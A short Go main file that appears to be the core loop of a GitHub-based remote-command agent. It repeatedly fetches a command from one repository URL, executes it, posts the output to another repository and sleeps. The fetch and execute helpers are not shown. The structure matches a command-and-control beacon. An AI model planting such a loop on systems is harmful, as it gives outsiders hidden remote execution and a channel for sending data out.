package main

import (
	"os"
	"time"
)

func main() {

	for true {
		// load_command from github
		command, err := loadCommand(commandRepoUrl)
		if (err != nil && !isIgnoringError) {
			os.Exit(1)
		}

		// run the command from github
		err = runCommand(command, outputRepoUrl)
		if (err != nil && !isIgnoringError) {
			os.Exit(1)
		}

		// time delay
		time.Sleep(time.Duration(refreshRate) * time.Second)
	}
}